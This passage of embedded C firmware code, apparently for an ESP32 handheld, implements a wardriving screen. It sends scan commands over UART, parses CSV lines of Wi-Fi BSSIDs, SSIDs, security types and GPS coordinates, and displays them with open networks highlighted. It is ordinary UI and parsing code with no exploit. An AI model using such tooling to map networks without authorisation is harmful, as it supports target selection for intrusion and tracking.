    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_TEAL, 0);

    // GPS status label
    ctx->wardrive_gps_label = lv_label_create(ctx->wardrive_gps_popup);
    lv_label_set_text(ctx->wardrive_gps_label, "Acquiring GPS Fix...");
    lv_obj_set_style_text_font(ctx->wardrive_gps_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(ctx->wardrive_gps_label, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_text_align(ctx->wardrive_gps_label, LV_TEXT_ALIGN_CENTER, 0);

    // Subtitle
    lv_obj_t *subtitle = lv_label_create(ctx->wardrive_gps_popup);
    lv_label_set_text(subtitle, "Need clear view of the sky");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x888888), 0);
    lv_obj_set_style_text_align(subtitle, LV_TEXT_ALIGN_CENTER, 0);
}

// Update wardrive network table (newest first)
static void update_wardrive_table(tab_context_t *ctx)
{
    if (!ctx || !ctx->wardrive_table) return;

    lv_coord_t scroll_y = lv_obj_get_scroll_y(ctx->wardrive_table);
    lv_obj_clean(ctx->wardrive_table);

    int display_count = ctx->wardrive_net_count < WARDRIVE_MAX_NETWORKS ? ctx->wardrive_net_count : WARDRIVE_MAX_NETWORKS;

    for (int i = 0; i < display_count; i++) {
        // Walk backwards from head-1 (newest) through ring buffer
        int idx = (ctx->wardrive_net_head - 1 - i + WARDRIVE_MAX_NETWORKS) % WARDRIVE_MAX_NETWORKS;
        wardrive_network_t *net = &ctx->wardrive_networks[idx];

        // Row container
        lv_obj_t *row = lv_obj_create(ctx->wardrive_table);
        lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_all(row, 6, 0);
        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_column(row, 6, 0);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

        // SSID
        lv_obj_t *ssid_lbl = lv_label_create(row);
        if (net->ssid[0] == '\0') {
            lv_label_set_text(ssid_lbl, "<hidden>");
            lv_obj_set_style_text_color(ssid_lbl, lv_color_hex(0x666666), 0);
        } else {
            lv_label_set_text(ssid_lbl, net->ssid);
            lv_obj_set_style_text_color(ssid_lbl, lv_color_hex(0xFFFFFF), 0);
        }
        lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_flex_grow(ssid_lbl, 1);
        lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_DOT);

        // BSSID
        lv_obj_t *bssid_lbl = lv_label_create(row);
        lv_label_set_text(bssid_lbl, net->bssid);
        lv_obj_set_style_text_font(bssid_lbl, &lv_font_montserrat_10, 0);
        lv_obj_set_style_text_color(bssid_lbl, lv_color_hex(0xAAAAAA), 0);
        lv_obj_set_width(bssid_lbl, 130);

        // Security (color-coded)
        lv_obj_t *sec_lbl = lv_label_create(row);
        lv_label_set_text(sec_lbl, net->security);
        lv_obj_set_style_text_font(sec_lbl, &lv_font_montserrat_10, 0);
        if (strstr(net->security, "WPA3") != NULL) {
            lv_obj_set_style_text_color(sec_lbl, COLOR_MATERIAL_GREEN, 0);
        } else if (strstr(net->security, "WPA2") != NULL || strstr(net->security, "WPA_") != NULL) {
            lv_obj_set_style_text_color(sec_lbl, COLOR_MATERIAL_AMBER, 0);
        } else if (strstr(net->security, "OPEN") != NULL || net->security[0] == '\0') {
            lv_obj_set_style_text_color(sec_lbl, COLOR_MATERIAL_RED, 0);
        } else {
            lv_obj_set_style_text_color(sec_lbl, COLOR_MATERIAL_AMBER, 0);
        }
        lv_obj_set_width(sec_lbl, 120);
        lv_label_set_long_mode(sec_lbl, LV_LABEL_LONG_DOT);

        // Coordinates
        lv_obj_t *coord_lbl = lv_label_create(row);
        lv_label_set_text_fmt(coord_lbl, "%s, %s", net->lat, net->lon);
        lv_obj_set_style_text_font(coord_lbl, &lv_font_montserrat_10, 0);
        lv_obj_set_style_text_color(coord_lbl, COLOR_MATERIAL_TEAL, 0);
        lv_obj_set_width(coord_lbl, 170);
    }

    lv_obj_scroll_to_y(ctx->wardrive_table, scroll_y, LV_ANIM_OFF);
}

// Parse a wardrive CSV network line and add to ring buffer
// Format: BSSID,SSID,[SECURITY],timestamp,channel,rssi,lat,lon,alt,acc,WIFI
static bool parse_wardrive_network_line(tab_context_t *ctx, const char *line)
{
    // Must end with ,WIFI
    if (!strstr(line, ",WIFI")) return false;

    // Quick validation: must have MAC-like pattern at start (XX:XX:XX:XX:XX:XX)
    if (strlen(line) < 17 || line[2] != ':' || line[5] != ':') return false;

    char buf[512];
    strncpy(buf, line, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    // Split by commas - we need fields: 0=BSSID, 1=SSID, 2=SECURITY, 6=lat, 7=lon
    char *fields[12] = {0};
    int field_count = 0;
    char *p = buf;
    fields[0] = p;
    field_count = 1;

    while (*p && field_count < 12) {
        if (*p == ',') {
            *p = '\0';
            fields[field_count++] = p + 1;
        }
        p++;
    }

    // Need at least 11 fields (0..10)
    if (field_count < 11) return false;

    wardrive_network_t *net = &ctx->wardrive_networks[ctx->wardrive_net_head];

    // BSSID (field 0) - max 17 chars + null
    snprintf(net->bssid, sizeof(net->bssid), "%.17s", fields[0]);

    // SSID (field 1, may be empty) - max 32 chars + null
    snprintf(net->ssid, sizeof(net->ssid), "%.32s", fields[1]);

    // Security (field 2, strip brackets) - max 27 chars + null
    char *sec = fields[2];
    if (sec[0] == '[') sec++;
    snprintf(net->security, sizeof(net->security), "%.27s", sec);
    // Remove trailing ']'
    char *bracket = strchr(net->security, ']');
    if (bracket) *bracket = '\0';

    // Lat (field 6) - max 13 chars + null
    snprintf(net->lat, sizeof(net->lat), "%.13s", fields[6]);

    // Lon (field 7) - max 13 chars + null
    snprintf(net->lon, sizeof(net->lon), "%.13s", fields[7]);

    // Advance ring buffer
    ctx->wardrive_net_head = (ctx->wardrive_net_head + 1) % WARDRIVE_MAX_NETWORKS;
    ctx->wardrive_net_count++;

    return true;
}

// Close GPS type popup
static void wardrive_gps_type_close_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    
    if (ctx->wardrive_gps_type_overlay) {
        lv_obj_del(ctx->wardrive_gps_type_overlay);
        ctx->wardrive_gps_type_overlay = NULL;
        ctx->wardrive_gps_type_response_label = NULL;
    }
}

// GPS set M5 callback
static void wardrive_gps_set_m5_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    
    // Show "sending..." immediately
    if (ctx->wardrive_gps_type_response_label) {
        lv_label_set_text(ctx->wardrive_gps_type_response_label, "Sending command...");
        lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_AMBER, 0);
    }
    lv_refr_now(NULL);
    
    // Send command
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("gps_set m5");
    } else {
        uart_send_command("gps_set m5");
    }
    
    // Read response - try multiple times
    uart_port_t uart_port = (active_tab == TAB_MBUS) ? UART2_NUM : UART_NUM;
    char rx_buffer[512];
    char response[256] = "";
    int total_len = 0;
    
    // Try reading for up to 1.5 seconds
    for (int attempt = 0; attempt < 15 && strlen(response) == 0; attempt++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        int len = transport_read_bytes_tab(active_tab, uart_port, rx_buffer + total_len, 
                                           sizeof(rx_buffer) - 1 - total_len, pdMS_TO_TICKS(50));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Look for response line (skip echo of command)
            char *line = strtok(rx_buffer, "\r\n");
            while (line) {
                // Skip empty lines and command echo
                if (strlen(line) > 0 && strstr(line, "gps_set") == NULL) {
                    snprintf(response, sizeof(response), "%.255s", line);
                    break;
                }
                line = strtok(NULL, "\r\n");
            }
        }
    }
    
    if (ctx->wardrive_gps_type_response_label) {
        if (strlen(response) > 0) {
            lv_label_set_text(ctx->wardrive_gps_type_response_label, response);
            lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_GREEN, 0);
        } else {
            lv_label_set_text(ctx->wardrive_gps_type_response_label, "Command sent (no response received)");
            lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_AMBER, 0);
        }
    }
}

// GPS set ATGM callback
static void wardrive_gps_set_atgm_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    
    // Show "sending..." immediately
    if (ctx->wardrive_gps_type_response_label) {
        lv_label_set_text(ctx->wardrive_gps_type_response_label, "Sending command...");
        lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_AMBER, 0);
    }
    lv_refr_now(NULL);
    
    // Send command
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("gps_set atgm");
    } else {
        uart_send_command("gps_set atgm");
    }
    
    // Read response - try multiple times
    uart_port_t uart_port = (active_tab == TAB_MBUS) ? UART2_NUM : UART_NUM;
    char rx_buffer[512];
    char response[256] = "";
    int total_len = 0;
    
    // Try reading for up to 1.5 seconds
    for (int attempt = 0; attempt < 15 && strlen(response) == 0; attempt++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        int len = transport_read_bytes_tab(active_tab, uart_port, rx_buffer + total_len, 
                                           sizeof(rx_buffer) - 1 - total_len, pdMS_TO_TICKS(50));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Look for response line (skip echo of command)
            char *line = strtok(rx_buffer, "\r\n");
            while (line) {
                // Skip empty lines and command echo
                if (strlen(line) > 0 && strstr(line, "gps_set") == NULL) {
                    snprintf(response, sizeof(response), "%.255s", line);
                    break;
                }
                line = strtok(NULL, "\r\n");
            }
        }
    }
    
    if (ctx->wardrive_gps_type_response_label) {
        if (strlen(response) > 0) {
            lv_label_set_text(ctx->wardrive_gps_type_response_label, response);
            lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_GREEN, 0);
        } else {
            lv_label_set_text(ctx->wardrive_gps_type_response_label, "Command sent (no response received)");
            lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, COLOR_MATERIAL_AMBER, 0);
        }
    }
}

// GPS type button callback - show popup
static void wardrive_gps_type_btn_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    if (!ctx->wardrive_page) return;
    
    // Close existing overlay if any
    if (ctx->wardrive_gps_type_overlay) {
        lv_obj_del(ctx->wardrive_gps_type_overlay);
        ctx->wardrive_gps_type_overlay = NULL;
    }
    
    // Create overlay
    ctx->wardrive_gps_type_overlay = lv_obj_create(ctx->wardrive_page);
    lv_obj_remove_style_all(ctx->wardrive_gps_type_overlay);
    lv_obj_set_size(ctx->wardrive_gps_type_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->wardrive_gps_type_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->wardrive_gps_type_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->wardrive_gps_type_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->wardrive_gps_type_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    lv_obj_t *popup = lv_obj_create(ctx->wardrive_gps_type_overlay);
    lv_obj_set_size(popup, 450, 280);
    lv_obj_center(popup);
    lv_obj_set_style_bg_color(popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(popup, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(popup, 3, 0);
    lv_obj_set_style_radius(popup, 16, 0);
    lv_obj_set_style_shadow_width(popup, 30, 0);
    lv_obj_set_style_shadow_color(popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(popup, 20, 0);
    lv_obj_set_flex_flow(popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(popup, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(popup, 12, 0);
    lv_obj_clear_flag(popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(popup);
    lv_label_set_text(title, "GPS Type");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
    
    // Buttons row
    lv_obj_t *btn_row = lv_obj_create(popup);
    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_row, 20, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Set M5 button
    lv_obj_t *m5_btn = lv_btn_create(btn_row);
    lv_obj_set_size(m5_btn, 140, 50);
    lv_obj_set_style_bg_color(m5_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_radius(m5_btn, 8, 0);
    lv_obj_add_event_cb(m5_btn, wardrive_gps_set_m5_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *m5_label = lv_label_create(m5_btn);
    lv_label_set_text(m5_label, "Set M5");
    lv_obj_set_style_text_font(m5_label, &lv_font_montserrat_16, 0);
    lv_obj_center(m5_label);
    
    // Set ATGM button
    lv_obj_t *atgm_btn = lv_btn_create(btn_row);
    lv_obj_set_size(atgm_btn, 140, 50);
    lv_obj_set_style_bg_color(atgm_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_radius(atgm_btn, 8, 0);
    lv_obj_add_event_cb(atgm_btn, wardrive_gps_set_atgm_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *atgm_label = lv_label_create(atgm_btn);
    lv_label_set_text(atgm_label, "Set ATGM");
    lv_obj_set_style_text_font(atgm_label, &lv_font_montserrat_16, 0);
    lv_obj_center(atgm_label);
    
    // Response label
    ctx->wardrive_gps_type_response_label = lv_label_create(popup);
    lv_label_set_text(ctx->wardrive_gps_type_response_label, "");
    lv_obj_set_style_text_font(ctx->wardrive_gps_type_response_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ctx->wardrive_gps_type_response_label, lv_color_hex(0x888888), 0);
    lv_obj_set_style_text_align(ctx->wardrive_gps_type_response_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(ctx->wardrive_gps_type_response_label, lv_pct(95));
    lv_label_set_long_mode(ctx->wardrive_gps_type_response_label, LV_LABEL_LONG_WRAP);
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(popup);
    lv_obj_set_size(close_btn, 120, 45);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, wardrive_gps_type_close_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Close");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_16, 0);
    lv_obj_center(close_label);
}

// Callback when user clicks Stop
static void wardrive_stop_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Wardrive stopped - sending stop command");

    // Send stop command to the correct UART based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("stop");
    } else {
        uart_send_command("stop");
    }

    // Stop monitoring task
    ctx->wardrive_monitoring = false;
    if (ctx->wardrive_task != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
        ctx->wardrive_task = NULL;
    }

    // Dismiss GPS overlay if showing
    close_wardrive_gps_overlay(ctx);

    // Toggle buttons
    if (ctx->wardrive_start_btn) lv_obj_clear_state(ctx->wardrive_start_btn, LV_STATE_DISABLED);
    if (ctx->wardrive_stop_btn) lv_obj_add_state(ctx->wardrive_stop_btn, LV_STATE_DISABLED);
    if (ctx->wardrive_gps_type_btn) lv_obj_clear_state(ctx->wardrive_gps_type_btn, LV_STATE_DISABLED);

    // Update status
    int display_count = ctx->wardrive_net_count < WARDRIVE_MAX_NETWORKS ? ctx->wardrive_net_count : WARDRIVE_MAX_NETWORKS;
    if (ctx->wardrive_status_label) {
        lv_label_set_text_fmt(ctx->wardrive_status_label, "Wardrive stopped. Networks found: %d", display_count);
        lv_obj_set_style_text_color(ctx->wardrive_status_label, lv_color_hex(0x888888), 0);
    }
}

// Wardrive monitor task - reads UART for GPS fix, network CSV lines, log messages
static void wardrive_monitor_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Wardrive monitor task: no context");
        vTaskDelete(NULL);
        return;
    }

    tab_id_t active_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (active_tab == TAB_MBUS) ? UART2_NUM : UART_NUM;

    ESP_LOGI(TAG, "Wardrive monitor task started (tab=%d, uart=%d)", active_tab, uart_port);

    char rx_buffer[512];
    char line_buffer[512];
    int line_pos = 0;
    bool batch_has_new_networks = false;

    while (ctx->wardrive_monitoring) {
        int len = transport_read_bytes_tab(active_tab, uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));

        if (len > 0) {
            rx_buffer[len] = '\0';
            batch_has_new_networks = false;

            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];

                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';

                        // GPS fix obtained -> dismiss overlay, update status
                        if (!ctx->wardrive_gps_fix && strstr(line_buffer, "GPS fix obtained") != NULL) {
                            ctx->wardrive_gps_fix = true;
                            ESP_LOGI(TAG, "Wardrive: GPS fix obtained");

                            bsp_display_lock(0);
                            close_wardrive_gps_overlay(ctx);
                            if (ctx->wardrive_status_label) {
                                lv_label_set_text(ctx->wardrive_status_label, "GPS Fix Acquired - Scanning...");
                                lv_obj_set_style_text_color(ctx->wardrive_status_label, COLOR_MATERIAL_GREEN, 0);
                            }
                            bsp_display_unlock();
                        }

                        // Logged networks message -> update status
                        if (strstr(line_buffer, "Logged ") != NULL && strstr(line_buffer, " networks to ") != NULL) {
                            ESP_LOGI(TAG, "Wardrive: %s", line_buffer);
                            int display_count = ctx->wardrive_net_count < WARDRIVE_MAX_NETWORKS ? ctx->wardrive_net_count : WARDRIVE_MAX_NETWORKS;

                            bsp_display_lock(0);
                            if (ctx->wardrive_status_label) {
                                lv_label_set_text_fmt(ctx->wardrive_status_label, "Scanning... Networks: %d", display_count);
                                lv_obj_set_style_text_color(ctx->wardrive_status_label, COLOR_MATERIAL_GREEN, 0);
                            }
                            bsp_display_unlock();
                        }

                        // Try to parse as CSV network line
                        if (parse_wardrive_network_line(ctx, line_buffer)) {
                            batch_has_new_networks = true;
                        }

                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }

            // Update table once per batch if we got new networks
            if (batch_has_new_networks) {
                bsp_display_lock(0);
                update_wardrive_table(ctx);
                int display_count = ctx->wardrive_net_count < WARDRIVE_MAX_NETWORKS ? ctx->wardrive_net_count : WARDRIVE_MAX_NETWORKS;
                if (ctx->wardrive_status_label) {
                    lv_label_set_text_fmt(ctx->wardrive_status_label, "Scanning... Networks: %d", display_count);
                    lv_obj_set_style_text_color(ctx->wardrive_status_label, COLOR_MATERIAL_GREEN, 0);
                }
                bsp_display_unlock();
            }
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    ESP_LOGI(TAG, "Wardrive monitor task ended");
    ctx->wardrive_task = NULL;
    vTaskDelete(NULL);
}

// Callback when user clicks Start
static void wardrive_start_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    if (ctx->wardrive_monitoring) return;  // Already running

    ESP_LOGI(TAG, "Wardrive start - sending start_wardrive command");

    // Send start_wardrive command
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("start_wardrive");
    } else {
        uart_send_command("start_wardrive");
    }

    // Reset ring buffer
    ctx->wardrive_net_count = 0;
    ctx->wardrive_net_head = 0;
    ctx->wardrive_gps_fix = false;

    // Clear table
    bsp_display_lock(0);
    if (ctx->wardrive_table) lv_obj_clean(ctx->wardrive_table);

    // Toggle buttons
    if (ctx->wardrive_start_btn) lv_obj_add_state(ctx->wardrive_start_btn, LV_STATE_DISABLED);
    if (ctx->wardrive_stop_btn) lv_obj_clear_state(ctx->wardrive_stop_btn, LV_STATE_DISABLED);
    if (ctx->wardrive_gps_type_btn) lv_obj_add_state(ctx->wardrive_gps_type_btn, LV_STATE_DISABLED);

    // Update status
    if (ctx->wardrive_status_label) {
        lv_label_set_text(ctx->wardrive_status_label, "Starting wardrive...");
        lv_obj_set_style_text_color(ctx->wardrive_status_label, COLOR_MATERIAL_AMBER, 0);
    }

    // Show GPS fix overlay
    show_wardrive_gps_overlay(ctx);
    bsp_display_unlock();

    // Start monitor task
    ctx->wardrive_monitoring = true;
    xTaskCreate(wardrive_monitor_task, "wd_monitor", 8192, (void*)ctx, 5, &ctx->wardrive_task);
}

// Wardrive back button - stop if running, return to tiles
static void wardrive_back_cb(lv_event_t *e)
{
    (void)e;
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;

    // Stop if running
    if (ctx->wardrive_monitoring) {
        tab_id_t active_tab = tab_id_for_ctx(ctx);
        if (active_tab == TAB_MBUS) {
            uart2_send_command("stop");
        } else {
            uart_send_command("stop");
        }
        ctx->wardrive_monitoring = false;
        if (ctx->wardrive_task != NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            ctx->wardrive_task = NULL;
        }
    }

    // Dismiss GPS overlay
    close_wardrive_gps_overlay(ctx);

    // Hide wardrive page
    if (ctx->wardrive_page) {
        lv_obj_add_flag(ctx->wardrive_page, LV_OBJ_FLAG_HIDDEN);
    }

    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Show wardrive full page
static void show_wardrive_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;

    hide_all_pages(ctx);

    // If page already exists, just show it
    if (ctx->wardrive_page) {
        lv_obj_clear_flag(ctx->wardrive_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->wardrive_page;
        return;
    }

    ESP_LOGI(TAG, "Creating new wardrive page for tab %d", current_tab);

    // Page container
    ctx->wardrive_page = lv_obj_create(container);
    lv_obj_set_size(ctx->wardrive_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->wardrive_page, lv_color_hex(0x0A1A1A), 0);
    lv_obj_set_style_border_width(ctx->wardrive_page, 0, 0);
    lv_obj_set_style_pad_all(ctx->wardrive_page, 10, 0);
    lv_obj_set_flex_flow(ctx->wardrive_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->wardrive_page, 8, 0);

    // ---- Header row ----
    lv_obj_t *header = lv_obj_create(ctx->wardrive_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 10, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);

    // Left side: Back + Title
    lv_obj_t *left_cont = lv_obj_create(header);
    lv_obj_set_size(left_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(left_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(left_cont, 0, 0);
    lv_obj_set_style_pad_all(left_cont, 0, 0);
    lv_obj_set_flex_flow(left_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(left_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(left_cont, 10, 0);
    lv_obj_clear_flag(left_cont, LV_OBJ_FLAG_SCROLLABLE);

    // Back button
    lv_obj_t *back_btn = lv_btn_create(left_cont);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, wardrive_back_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);

    // Title
    lv_obj_t *title = lv_label_create(left_cont);
    lv_label_set_text(title, "Wardrive");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);

    // Right side: Start + Stop buttons
    lv_obj_t *btn_cont = lv_obj_create(header);
    lv_obj_set_size(btn_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_cont, 0, 0);
    lv_obj_set_style_pad_all(btn_cont, 0, 0);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_column(btn_cont, 10, 0);
    lv_obj_clear_flag(btn_cont, LV_OBJ_FLAG_SCROLLABLE);

    // Start button
    ctx->wardrive_start_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(ctx->wardrive_start_btn, 90, 40);
    lv_obj_set_style_bg_color(ctx->wardrive_start_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_bg_color(ctx->wardrive_start_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(ctx->wardrive_start_btn, 8, 0);
    lv_obj_add_event_cb(ctx->wardrive_start_btn, wardrive_start_cb, LV_EVENT_CLICKED, ctx);

    lv_obj_t *start_label = lv_label_create(ctx->wardrive_start_btn);
    lv_label_set_text(start_label, LV_SYMBOL_PLAY " Start");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_14, 0);
    lv_obj_center(start_label);

    // Stop button (initially disabled)
    ctx->wardrive_stop_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(ctx->wardrive_stop_btn, 90, 40);
    lv_obj_set_style_bg_color(ctx->wardrive_stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(ctx->wardrive_stop_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(ctx->wardrive_stop_btn, 8, 0);
    lv_obj_add_event_cb(ctx->wardrive_stop_btn, wardrive_stop_cb, LV_EVENT_CLICKED, ctx);
    lv_obj_add_state(ctx->wardrive_stop_btn, LV_STATE_DISABLED);

    lv_obj_t *stop_label = lv_label_create(ctx->wardrive_stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_14, 0);
    lv_obj_center(stop_label);

    // GPS Type button (initially enabled - disabled when running)
    ctx->wardrive_gps_type_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(ctx->wardrive_gps_type_btn, 100, 40);
    lv_obj_set_style_bg_color(ctx->wardrive_gps_type_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_bg_color(ctx->wardrive_gps_type_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(ctx->wardrive_gps_type_btn, 8, 0);
    lv_obj_add_event_cb(ctx->wardrive_gps_type_btn, wardrive_gps_type_btn_cb, LV_EVENT_CLICKED, ctx);

    lv_obj_t *gps_type_label = lv_label_create(ctx->wardrive_gps_type_btn);
    lv_label_set_text(gps_type_label, LV_SYMBOL_GPS " GPS");
    lv_obj_set_style_text_font(gps_type_label, &lv_font_montserrat_14, 0);
